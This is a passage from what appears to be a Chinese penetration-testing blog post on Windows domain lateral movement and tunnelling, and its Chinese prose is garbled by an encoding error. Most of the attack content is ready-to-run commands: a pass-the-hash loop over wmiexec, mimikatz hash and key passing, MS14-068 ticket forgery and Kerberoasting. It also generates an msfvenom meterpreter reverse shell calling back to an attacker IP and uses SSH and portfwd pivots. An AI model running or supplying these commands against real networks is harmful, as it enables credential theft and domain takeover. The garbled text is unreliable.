os,timeips=&#123;&#39;192.168.3.21&#39;,&#39;192.168.3.25&#39;,&#39;192.168.3.29&#39;,&#39;192.168.3.30&#39;,&#39;192.168.3.32&#39;&#125;users=&#123;&#39;Administrator&#39;,&#39;boss&#39;,&#39;dbadmin&#39;,&#39;fileadmin&#39;,&#39;mack&#39;,&#39;mary&#39;,&#39;webadmin&#39;&#125;hashs=&#123;&#39;ccef208c6485269c20db2cad21734fe7&#39;,&#39;518b98ad4178a53695dc997aa02d455c&#39;&#125;for ip in ips:for user in users:for mimahash in hashs:#wmiexec -hashes :hashgod/user@ipwhoamiexec = &quot;wmiexec -hashes :&quot;+mimahash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)os.system(exec)time.sleep(0.5)</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220320183203790.png" alt="image-20220320183203790"></p><h2 id="PTH-amp-PTK-amp-PTTå“ˆå¸Œç¥¨æ®ä¼ é€’"><a href="#PTH-amp-PTK-amp-PTTå“ˆå¸Œç¥¨æ®ä¼ é€’" class="headerlink" title="PTH&amp;PTK&amp;PTTå“ˆå¸Œç¥¨æ®ä¼ é€’"></a><strong>PTH&amp;PTK&amp;PTTå“ˆå¸Œç¥¨æ®ä¼ é€’</strong></h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322132427400.png" alt="image-20220322132427400"></p><p>Kerberos åè®®åœ¨åŸŸä¸­å…·ä½“å·¥ä½œæ–¹æ³•ï¼š </p><p>**1ã€å®¢æˆ·æœºå°†æ˜æ–‡å¯†ç è¿›è¡Œ NTLM å“ˆå¸Œ,ç„¶åå’Œæ—¶é—´æˆ³ä¸€èµ·åŠ å¯†(ä½¿ç”¨ krbtgt å¯†ç  hash ä½œä¸ºå¯†é’¥)ï¼Œå‘é€ç»™ kdcï¼ˆåŸŸæ§ï¼‰ï¼Œkdc å¯¹ç”¨æˆ·è¿›è¡Œæ£€ æµ‹ï¼ŒæˆåŠŸä¹‹ååˆ›å»º TGT(Ticket-Granting Ticket) **</p><p>**2ã€å°† TGT è¿›è¡ŒåŠ å¯†ç­¾åè¿”å›ç»™å®¢æˆ·æœºå™¨ï¼Œåªæœ‰åŸŸç”¨æˆ· krbtgt æ‰èƒ½è¯» å– kerberos ä¸­ TGT æ•°æ® **</p><p>**3ã€ ç„¶åå®¢æˆ·æœºå°† TGT å‘é€ç»™åŸŸæ§åˆ¶å™¨ KDC è¯·æ±‚ TGSï¼ˆç¥¨è¯æˆæƒæœ åŠ¡ï¼‰ç¥¨è¯ï¼Œå¹¶ä¸”å¯¹ TGT è¿›è¡Œæ£€æµ‹ **</p><p><strong>4ã€ æ£€æµ‹æˆåŠŸä¹‹åï¼Œå°†ç›®æ ‡æœåŠ¡è´¦æˆ·çš„ NTLM ä»¥åŠ TGT è¿›è¡ŒåŠ å¯†ï¼Œå°† åŠ å¯†åçš„ç»“æœè¿”å›ç»™å®¢æˆ·æœºã€‚</strong></p><pre><code>PTH(pass the hash) #åˆ©ç”¨ lm æˆ– ntlm çš„å€¼è¿›è¡Œçš„æ¸—é€æµ‹è¯• PTT(pass the ticket) #åˆ©ç”¨çš„ç¥¨æ®å‡­è¯ TGT è¿›è¡Œçš„æ¸—é€æµ‹è¯• PTK(pass the key) #åˆ©ç”¨çš„ ekeys aes256 è¿›è¡Œçš„æ¸—é€æµ‹è¯•</code></pre><p><strong>PTH</strong></p><p>PTH åœ¨å†…ç½‘æ¸—é€ä¸­æ˜¯ä¸€ç§å¾ˆç»å…¸çš„æ”»å‡»æ–¹å¼ï¼ŒåŸç†å°±æ˜¯æ”»å‡»è€…å¯ä»¥ç›´æ¥é€šè¿‡ LM Hash å’Œ NTLM Hash è®¿é—®è¿œç¨‹ä¸»æœºæˆ–æœåŠ¡ï¼Œè€Œä¸ç”¨æä¾›æ˜æ–‡å¯†ç ã€‚å¦‚æœç¦ç”¨äº† ntlm è®¤è¯ï¼ŒPsExec æ— æ³•åˆ©ç”¨è·å¾—çš„ ntlm hash è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œä½†æ˜¯ä½¿ç”¨ mimikatz è¿˜æ˜¯å¯ ä»¥æ”»å‡»æˆåŠŸã€‚å¯¹äº 8.1/2012r2ï¼Œå®‰è£…è¡¥ä¸ kb2871997 çš„ Win 7/2008r2/8/2012 ç­‰ï¼Œå¯ä»¥ä½¿ç”¨ AES keys ä»£æ›¿ NT hash æ¥å®ç° ptk æ”»å‡»ã€‚</p><p> æ€»ç»“ï¼šKB2871997 è¡¥ä¸åçš„å½±å“</p><p>pthï¼šæ²¡æ‰“è¡¥ä¸ç”¨æˆ·éƒ½å¯ä»¥è¿æ¥ï¼Œæ‰“äº†è¡¥ä¸åªèƒ½ administrator è¿æ¥ </p><p>ptkï¼šæ‰“äº†è¡¥ä¸æ‰èƒ½ç”¨æˆ·éƒ½å¯ä»¥è¿æ¥ï¼Œé‡‡ç”¨ aes256 è¿æ¥</p><p>å‚è€ƒé“¾æ¥: <a href="https://www.freebuf.com/column/220740.html">https://www.freebuf.com/column/220740.html</a></p><p><strong>PTT</strong></p><p>PTT æ”»å‡»çš„éƒ¨åˆ†å°±ä¸æ˜¯ç®€å•çš„ NTLM è®¤è¯äº†ï¼Œå®ƒæ˜¯åˆ©ç”¨ Kerberos åè®®è¿›è¡Œæ”»å‡»çš„ã€‚</p><p>ä¸‰ç§ å¸¸è§çš„æ”»å‡»æ–¹æ³•ï¼šMS14-068ï¼ŒGolden ticketï¼ŒSILVER ticketã€‚</p><p>MS14-068 åŸºäºæ¼æ´ï¼Œé€ æˆçš„å±å®³æ˜¯å…è®¸åŸŸå†…ä»»ä½•ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œå°†è‡ªå·±æå‡è‡³åŸŸç®¡æƒé™ï¼Œå¾®è½¯ç»™å‡ºçš„è¡¥ä¸æ˜¯ kb3011780ã€‚</p><p>Golden ticket(é»„é‡‘ç¥¨æ®)ï¼ŒSILVER ticket(ç™½é“¶ç¥¨æ®)ï¼Œå±äºæƒé™ç»´æŒæŠ€æœ¯ ï¼Œç®€å•æ¥è¯´å°±æ˜¯å°†è¿æ¥åˆæ³•çš„ç¥¨æ®æ³¨å…¥åˆ° å†…å­˜ä¸­å®ç°è¿æ¥ã€‚</p><p><strong>æ¡ˆä¾‹:</strong></p><p><strong>1.PTHä¼ é€’-mimikatz</strong></p><p>å¦‚æœç¦ç”¨äº† ntlm è®¤è¯ï¼ŒPsExec æ— æ³•åˆ©ç”¨è·å¾—çš„ ntlm hash è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œä½†æ˜¯ä½¿ç”¨ mimikatz è¿˜æ˜¯å¯ ä»¥æ”»å‡»æˆåŠŸã€‚</p><pre><code>privilege::debugsekurlsa::logonPasswords</code></pre><p>å‡è®¾æˆ‘ä»¬æ‰¾åˆ°äº†åŸŸæ§çš„hashå¯†ç </p><pre><code># PTH ntlm ä¼ é€’# æœªæ‰“è¡¥ä¸ä¸‹çš„å·¥ä½œç»„åŠåŸŸè¿æ¥ï¼šsekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7  #è¿æ¥åŸŸç”¨æˆ·sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c #è¿æ¥æœ¬åœ°ç”¨æˆ·sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7\\OWA2010CN-God.god.org</code></pre><p>å°±ä¼šå¼¹å‡ºä¸€ä¸ªcmdçª—å£</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322173836031.png" alt="image-20220322173836031"></p><p><strong>2.PTKä¼ é€’-mimikatz</strong></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220322180108315.png" alt="image-20220322180108315"></p><p>è¿™ä¸ªå¿…é¡»æ‰“äº†è¡¥ä¸æ‰èƒ½è¿æ¥ï¼Œä¸ç„¶è¿ä¸ä¸Šå»</p><pre><code>PTK aes256 ä¼ é€’æ‰“è¡¥ä¸åçš„å·¥ä½œç»„åŠåŸŸè¿æ¥ï¼šsekurlsa::ekeys #è·å– aessekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</code></pre><p><strong>3.åŸŸæ¨ªå‘ç§»åŠ¨ PTT ä¼ é€’-ms14068&amp;kekeo&amp;æœ¬åœ°</strong></p><p>ç¬¬ä¸€ç§åˆ©ç”¨æ¼æ´ï¼šèƒ½å®ç°æ™®é€šç”¨æˆ·ç›´æ¥è·å–åŸŸæ§ system æƒé™</p><p>æ­¤å¤„mimikatzæ— éœ€æå‡æƒé™ï¼Œå› ä¸ºä¸æ¶‰åŠé«˜æƒé™æ“ä½œï¼Œä¸€ä¸ªæ™®é€šç”¨æˆ·å°±å¯ä»¥</p><pre><code>#MS14-068 powershell æ‰§è¡Œ1.æŸ¥çœ‹å½“å‰ sid whoami/user2.mimikatz # kerberos::purge//æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ mimikatz # kerberos::list //æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯mimikatz # kerberos::ptc ç¥¨æ®æ–‡ä»¶ //å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­3.åˆ©ç”¨ ms14-068 ç”Ÿæˆ TGT æ•°æ®ms14-068.exe -u åŸŸæˆå‘˜å@åŸŸå -s sid -d åŸŸæ§åˆ¶å™¨åœ°å€ -p åŸŸæˆå‘˜å¯†ç MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#454.ç¥¨æ®æ³¨å…¥å†…å­˜mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit5.æŸ¥çœ‹å‡­è¯åˆ—è¡¨ klist6.åˆ©ç”¨dir \\192.168.3.21\c$  #å¦‚æœipæ— æ³•è¯†åˆ«ï¼Œæ”¹æˆè®¡ç®—æœºåå­—</code></pre><p>ç¬¬äºŒç§åˆ©ç”¨å·¥å…· kekeo</p><pre><code>1.ç”Ÿæˆç¥¨æ®kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;2.å¯¼å…¥ç¥¨æ®kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi3.æŸ¥çœ‹å‡­è¯ klist4.åˆ©ç”¨ net use è½½å…¥dir \\192.168.3.21\c$</code></pre><p>ç¬¬ä¸‰ç§åˆ©ç”¨mimikatzå¯¼å‡ºæœ¬åœ°ç¥¨æ®(éœ€è¦ç®¡ç†æƒé™)</p><p>åŸŸæ§è¿æ¥å10hå†…æœ‰æ•ˆ</p><pre><code>privilege::debugsekurlsa::tickets /exportkerberos::ptt xxxxxxxxxx.xxxx.kirbi</code></pre><p><strong>æ€»ç»“ï¼šptt ä¼ é€’ä¸éœ€æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œè¿æ¥æ—¶ä¸»æœºåè¿æ¥ï¼ŒåŸºäºæ¼æ´,å·¥å…·,æœ¬åœ°ç¥¨æ®</strong></p><h2 id="RDPä¸SPN"><a href="#RDPä¸SPN" class="headerlink" title="RDPä¸SPN"></a><strong>RDPä¸SPN</strong></h2><p><strong>RDP</strong></p><p>RDPåè®®è¿æ¥ï¼šåˆ¤æ–­å¯¹æ–¹è¿œç¨‹æ¡Œé¢æœåŠ¡æ˜¯å¦å¼€å¯ï¼ˆé»˜è®¤ï¼š3389ï¼‰ï¼Œç«¯å£æ‰«æåˆ¤æ–­</p><pre><code>RDPæ˜æ–‡å¯†ç é“¾æ¥1.windows: mstsc2.mstsc.exe /console /v:192.168.3.21 /admin3.linux: rdesktop 192.168.3.21:3389RDPå¯†æ–‡HASHé“¾æ¥windows Serveréœ€è¦å¼€å¯ Restricted Admin modeï¼Œåœ¨Windows 8.1å’ŒWindows Server 2012 R2ä¸­é»˜è®¤å¼€å¯ï¼ŒåŒæ—¶å¦‚æœWin 7 å’ŒWindows Server 2008 R2å®‰è£…äº†2871997ã€2973351è¡¥ä¸ä¹Ÿæ”¯æŒï¼›å¼€å¯å‘½ä»¤ï¼šREG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /få¼€å¯åè¿è¡Œï¼š1.mstsc.exe /restrictedadmin2.mimikatz.exe3.privilege::debug4.sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot;</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/4c75562739b29a50be3268d18090dd94.png" alt="img"></p><p><strong>åŸŸæ¨ªå‘ç§»åŠ¨SPNæœåŠ¡-æ¢é’ˆ,è¯·æ±‚,å¯¼å‡º,ç ´è§£,é‡å†™</strong></p><p>é»‘å®¢å¯ä»¥ä½¿ç”¨æœ‰æ•ˆçš„åŸŸç”¨æˆ·çš„èº«ä»½éªŒè¯ç¥¨è¯ï¼ˆTGTï¼‰å»è¯·æ±‚è¿è¡Œåœ¨æœåŠ¡å™¨ä¸Šçš„ä¸€ä¸ªæˆ–å¤šä¸ªç›®æ ‡æœåŠ¡çš„æœåŠ¡ç¥¨è¯ã€‚DCåœ¨æ´»åŠ¨ç›®å½•ä¸­æŸ¥æ‰¾SPNï¼Œå¹¶ä½¿ç”¨ä¸SPNå…³è”çš„æœåŠ¡å¸æˆ·åŠ å¯†ç¥¨è¯ï¼Œä»¥ä¾¿æœåŠ¡èƒ½å¤ŸéªŒè¯ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®ã€‚è¯·æ±‚çš„KerberosæœåŠ¡ç¥¨è¯çš„åŠ å¯†ç±»å‹æ˜¯RC4_HMAC_MD5ï¼Œè¿™æ„å‘³ç€æœåŠ¡å¸æˆ·çš„NTLMå¯†ç å“ˆå¸Œç”¨äºåŠ å¯†æœåŠ¡ç¥¨è¯ã€‚é»‘å®¢å°†æ”¶åˆ°çš„TGSç¥¨æ®ç¦»çº¿è¿›è¡Œç ´è§£ï¼Œå³å¯å¾—åˆ°ç›®æ ‡æœåŠ¡å¸å·çš„HASHï¼Œè¿™ä¸ªç§°ä¹‹ä¸ºKerberoastæ”»å‡»ã€‚å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªä¸ºåŸŸç”¨æˆ·å¸æˆ·æ³¨å†Œçš„ä»»æ„SPNï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å¸æˆ·çš„æ˜æ–‡å¯†ç çš„NTLMå“ˆå¸Œå€¼å°±å°†ç”¨äºåˆ›å»ºæœåŠ¡ç¥¨è¯ã€‚è¿™å°±æ˜¯Kerberoastingæ”»å‡»çš„å…³é”®ã€‚</p><p>1ã€æ¢é’ˆ</p><pre><code>setspn -q */*setspn -q */* | findstr &quot;MSSQL&quot;</code></pre><p>2ã€è¯·æ±‚ç¥¨æ®</p><pre><code>klist purge //åˆ é™¤ç¼“å­˜ç¥¨æ®klist    //æŸ¥çœ‹ç¥¨æ®# è¯·æ±‚ç¥¨æ® # powershellè¯·æ±‚Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;# æˆ–è€…mimikatzè¯·æ±‚mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;</code></pre><p>3ã€å¯¼å‡ºç¥¨æ®(åˆ°mimikatzè¿è¡Œç›®å½•)</p><pre><code># mimikatzmimikatz.exe &quot;kerberos::list /export&quot;</code></pre><p>4ã€ç ´è§£ç¥¨æ®</p><pre><code># ç ´è§£å·¥å…·tgsrepcrack.py python3ç¯å¢ƒè¿è¡Œï¼ˆå°†ç¥¨æ®æ‹–åˆ°æœ¬åœ°ç ´è§£ï¼‰python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</code></pre><p>5ã€é‡å†™ç¥¨æ®ï¼ˆå±äºåç»­æ”»å‡»ï¼Œä¸ä¸€å®šä¼šæˆåŠŸï¼Œ-u500æŒ‡çš„æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œ-g512æŒ‡çš„æ˜¯ç®¡ç†å‘˜ç»„ï¼‰</p><pre><code>python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512mimikatz.exe kerberos::ptt xxxx.kirbi # å°†ç”Ÿæˆçš„ç¥¨æ®æ³¨å…¥å†…å­˜</code></pre><p>6ã€åˆ©ç”¨</p><pre><code>dir //xxx.xxx.xxx.xxx/c$</code></pre><h1 id="éš§é“æŠ€æœ¯"><a href="#éš§é“æŠ€æœ¯" class="headerlink" title="éš§é“æŠ€æœ¯"></a>éš§é“æŠ€æœ¯</h1><h2 id="sshéš§é“"><a href="#sshéš§é“" class="headerlink" title="sshéš§é“"></a>sshéš§é“</h2><p>é€šå¸¸ï¼Œæˆ‘ä»¬ç”¨äºè°ƒè¯•çš„è®¡ç®—æœºæ— æ³•è¿œç¨‹è®¿é—®ä½äºå±€åŸŸç½‘ä¸­çš„å¾…è°ƒè¯•è®¾å¤‡ã€‚é€šè¿‡ ssh çš„ç«¯å£è½¬å‘(åˆç§° ssh éš§é“)æŠ€æœ¯ï¼Œå¯ä»¥å®ç°è¿™ç§è¿œç¨‹è°ƒè¯•åŠŸèƒ½ã€‚ssh å®¢æˆ·ç«¯è¿è¡Œäºæœ¬åœ°æœºå™¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯ï¼šç™»å½•åˆ°ç›®æ ‡æœºå™¨å¹¶åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚å®ƒå¯ä»¥å»ºç«‹ä¸€ä¸ªå®‰å…¨é€šé“ï¼Œä¸ºä¸å®‰å…¨ç½‘ç»œä¸Šä¸¤ä¸ªä¸å—ä¿¡ä»»çš„ä¸»æœºæä¾›å®‰å…¨çš„åŠ å¯†é€šä¿¡ã€‚X11 è¿æ¥ã€ä»»æ„ TCP ç«¯å£å’Œ UNIX åŸŸå¥—æ¥å­—ä¹Ÿå¯ä»¥é€šè¿‡ ssh å®‰å…¨é€šé“è¿›è¡Œè½¬å‘ã€‚ssh è¿æ¥å¹¶ç™»å½•åˆ°æŒ‡å®šçš„ä¸»æœºå(ç”¨æˆ·åå¯é€‰)ã€‚å¦‚æœæŒ‡å®šäº†å‘½ä»¤ï¼Œå‘½ä»¤å°†åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œï¼Œè€Œä¸æ˜¯åœ¨æœ¬æœº shell é‡Œæ‰§è¡Œã€‚</p><p>ssh ç«¯å£è½¬å‘ç›¸å…³çš„å¸¸ç”¨é€‰é¡¹å¦‚ä¸‹ï¼š</p><hr><p><strong>-C</strong></p><p>è¯·æ±‚å‹ç¼©æ‰€æœ‰æ•°æ®(åŒ…æ‹¬ stdinã€stdoutã€stderr å’Œç”¨äºè½¬å‘çš„ X11ã€TCP å’Œ UNIX åŸŸè¿æ¥çš„æ•°æ®)ã€‚å‹ç¼©ç®—æ³•ä¸ gzip ä½¿ç”¨çš„ç®—æ³•ç›¸åŒï¼Œå‹ç¼©çº§åˆ«ç”± ssh åè®®ç‰ˆæœ¬ 1 çš„ CompressionLevel é€‰é¡¹æ§åˆ¶ã€‚åœ¨è°ƒåˆ¶è§£è°ƒå™¨çº¿è·¯å’Œå…¶ä»–æ…¢é€Ÿè¿æ¥ä¸Šé‡‡ç”¨å‹ç¼©æ˜¯å¯å–çš„ï¼Œä½†å®ƒä¼šå‡æ…¢å¿«é€Ÿç½‘ç»œä¸Šçš„é€Ÿåº¦ã€‚</p><hr><p><strong>-f</strong></p><p>è¯·æ±‚ ssh åœ¨æ‰§è¡Œå‘½ä»¤ä¹‹å‰è½¬åˆ°åå°ã€‚å¦‚æœç”¨æˆ·å¸Œæœ› ssh åœ¨åå°è¿è¡Œï¼Œä½† ssh éœ€è¦ç”¨æˆ·æä¾›å¯†ç æˆ–å£ä»¤ï¼Œä½¿ç”¨ -f é€‰é¡¹å°±å¾ˆæœ‰ç”¨ï¼Œåœ¨ç”¨æˆ·è¾“å…¥å¯†ç ä¹‹åï¼Œssh å°±ä¼šè½¬å…¥åå°è¿è¡Œã€‚è¿™ä¸ªé€‰é¡¹éšå«äº† -n é€‰é¡¹çš„åŠŸèƒ½(-n é€‰é¡¹å°† stdin é‡å®šå‘åˆ° /dev/nullï¼Œä»è€Œé¿å…åå°è¿›ç¨‹è¯» stdin)ã€‚åœ¨è¿œç¨‹ç«™ç‚¹ä¸Šå¯åŠ¨ X11 ç¨‹åºçš„æ¨èæ–¹æ³•æ˜¯ä½¿ç”¨ â€œssh -f host xtermâ€ ã€‚</p><p>å¦‚æœ ExitOnForwardFailure é…ç½®é€‰é¡¹è®¾ç½®çš„æ˜¯ â€œyesâ€ï¼Œåˆ™ä½¿ç”¨ -f é€‰é¡¹å¯åŠ¨çš„ ssh å®¢æˆ·ç«¯ä¼šç­‰æ‰€æœ‰çš„è¿œç¨‹ç«¯å£è½¬å‘å»ºç«‹æˆåŠŸåæ‰å°†è‡ªå·±è½¬åˆ°åå°è¿è¡Œã€‚</p><hr><p><strong>-n</strong></p><p>å°† stdin é‡å®šå‘åˆ° /dev/null (å®é™…ä¸Šæ˜¯ä¸ºäº†é˜²æ­¢åå°è¿›ç¨‹ä»stdinè¯»å–æ•°æ®)ã€‚å½“ ssh åœ¨åå°è¿è¡Œæ—¶å¿…é¡»ä½¿ç”¨æ­¤é€‰é¡¹ã€‚</p><p>ä¸€ä¸ªå¸¸è§çš„æŠ€å·§æ˜¯ä½¿ç”¨å®ƒåœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œ X11 ç¨‹åºã€‚ä¾‹å¦‚ï¼Œ<code>ssh -n shadow.cs.hut.fi emacs &amp;</code> å°†åœ¨ shadows.cs.hut.fi ä¸Šå¯åŠ¨ emacs ç¨‹åºã€‚X11 çš„è¿æ¥å°†é€šè¿‡åŠ å¯†é€šé“è‡ªåŠ¨è½¬å‘ã€‚ssh ç¨‹åºå°†åœ¨åå°è¿è¡Œã€‚(å¦‚æœ ssh éœ€è¦è¯·æ±‚å¯†ç æˆ–å£ä»¤ï¼Œåˆ™æ­¤æ“ä½œæ— æ•ˆï¼›å‚è§-fé€‰é¡¹ã€‚)</p><hr><p><strong>-N</strong></p><p>ä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚æ­¤é€‰é¡¹ç”¨äºåªéœ€è¦ç«¯å£è½¬å‘åŠŸèƒ½æ—¶ã€‚</p><hr><p><strong>-g</strong></p><p>å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥åˆ°æœ¬åœ°è½¬å‘ç«¯å£ã€‚å¦‚æœç”¨äºå¤šè·¯å¤ç”¨è¿æ¥ï¼Œåˆ™å¿…é¡»åœ¨ä¸»è¿›ç¨‹ä¸ŠæŒ‡å®šæ­¤é€‰é¡¹ã€‚</p><hr><p><strong>-t</strong></p><p>å¼ºåˆ¶åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ã€‚åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œä»»æ„çš„åŸºäºå±å¹•çš„ç¨‹åºæ—¶(ä¾‹å¦‚ï¼Œå®ç°èœå•æœåŠ¡)ï¼Œåˆ†é…ä¼ªç»ˆç«¯å¾ˆæœ‰ç”¨ã€‚ä½¿ç”¨å¤šä¸ª -t é€‰é¡¹åˆ™ä¼šå¼ºåˆ¶åˆ†é…ç»ˆç«¯ï¼Œå³ä½¿ ssh æ²¡æœ‰æœ¬åœ°ç»ˆç«¯ã€‚</p><hr><p><strong>-T</strong></p><p>ç¦æ­¢åˆ†é…ä¼ªç»ˆç«¯ã€‚</p><hr><p><strong>-L [bind_address:]port:host:hostport</strong><br><strong>-L [bind_address:]port:remote_socket</strong><br><strong>-L local_socket:host:hostport</strong><br><strong>-L local_socket:remote_socket</strong></p><p>æ•°æ®ä»æœ¬æœºè½¬å‘åˆ°è¿œç¨‹ã€‚æœ¬æœºä¸ŠæŒ‡å®š TCP ç«¯å£æˆ– UNIX å¥—æ¥å­—çš„è¿æ¥å°†è¢«è½¬å‘åˆ°ç›®æ ‡æœºä¸ŠæŒ‡å®šç«¯å£æˆ–å¥—æ¥å­—ã€‚</p><p>ä¸Šè¿°å‚æ•°ä¸­ï¼Œbind_address æŒ‡æœ¬åœ°åœ°å€ï¼›port æŒ‡æœ¬åœ°ç«¯å£ï¼›local_socket æŒ‡æœ¬åœ° UNIX å¥—æ¥å­—ï¼›host æŒ‡è¿œç¨‹ä¸»æœºåœ°å€ï¼›hostport æŒ‡è¿œç¨‹ç«¯å£ï¼›remote_socket æŒ‡è¿œç¨‹ UNIX å¥—æ¥å­—ã€‚</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318150851834.png" alt="image-20220318150851834"> </p><p><strong>ssh ç«¯å£è½¬å‘æ¨¡å¼</strong></p><p>ssh çš„ç«¯å£è½¬å‘æœ‰ä¸‰ç§æ¨¡å¼ï¼š</p><ul><li><p><strong>æœ¬åœ°ï¼šssh -C -f -N -g -L local_listen_port:remote_host:remote_port agent_user@agent_host</strong></p><p>å°†æœ¬åœ°æœºç›‘å¬ç«¯å£ local_listen_port ä¸Šçš„æ•°æ®è½¬å‘åˆ°è¿œç¨‹ç«¯å£ remote_host:remote_port</p></li><li><p><strong>è¿œç¨‹ï¼šssh -C -f -N -g -R agent_listen_port:local_host:local_port agent_user@agent_host</strong></p><p>å°†ä»£ç†æœºç›‘å¬ç«¯å£ agent_listen_port ä¸Šçš„æ•°æ®è½¬å‘åˆ°æœ¬åœ°ç«¯å£ local_host:local_port</p></li><li><p><strong>åŠ¨æ€ï¼šssh -C -f -N -g -D listen_port agent_user@agent_host</strong></p></li></ul><p><strong>æ­£å‘è¿æ¥</strong></p><p>WEBæœåŠ¡å™¨æ‰§è¡Œ</p><pre><code>ssh -CNfL 0.0.0.0:7777:10.10.10.128:80 web@192.168.0.144</code></pre><p><strong>åå‘è¿æ¥</strong></p><p>åœ¨æ”»å‡»æœºä¸Šå¯åŠ¨ssh</p><pre><code>/etc/init.d/ssh start</code></pre><p>åœ¨webæœåŠ¡å™¨ä¸Šæ‰§è¡Œ</p><pre><code>ssh -qTfnN -R port:host:hostport remote_ipssh -qTfnN -R 2222:127.0.0.1:22 root@192.168.0.115  # å°†æœ¬åœ°çš„22ç«¯å£è½¬å‘åˆ°192.168.0.115 çš„2222ç«¯å£</code></pre><p>æ”»å‡»æœºä¸Šå†æ‰§è¡Œ</p><pre><code>ssh -p 2222 web@127.0.0.1</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318161331485.png" alt="image-20220318161331485"></p><p><strong>Socketä»£ç†</strong></p><pre><code>SSH -qTfnN -D port remotehots</code></pre><h2 id="ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„"><a href="#ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„" class="headerlink" title="ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„"></a>ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„</h2><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318213918972.png" alt="image-20220318213918972"></p><p>ç”Ÿæˆmetaploitåé—¨</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.196 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.196set lport 12345exploit</code></pre><p>å½“è¿è¡Œåé—¨ï¼Œå¾—åˆ°åå¼¹shellå</p><p><strong>æ˜ å°„ç«¯å£:</strong></p><pre><code>portfwd add -L 192.168.0.115 -l 2020 -p 80 -r 10.10.10.128</code></pre><p>æ­¤æ—¶æˆ‘ä»¬è®¿é—® æœ¬æœºçš„2020ç«¯å£ å³æ‰“å¼€192.168.0.115:2020 å®é™…ä¸Šè®¿é—®çš„æ˜¯ 10.10.10.128:80 çš„æœåŠ¡</p><p><strong>ç«¯å£è½¬å‘</strong></p><pre><code>portfwd add -l 5555 -p 3389 -r 192.168.0.149 #å°†è‚‰é¸¡çš„3389ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„5555ç«¯å£rdesktop 127.0.0.1:5555</code></pre><p><strong>æŸ¥çœ‹åˆ—è¡¨</strong></p><pre><code>portfwd list</code></pre><p><strong>æ¸…ç©ºåˆ—è¡¨</strong></p><pre><code>portfwd flush</code></pre><h2 id="socketéš§é“"><a href="#socketéš§é“" class="headerlink" title="socketéš§é“"></a>socketéš§é“</h2><p><img 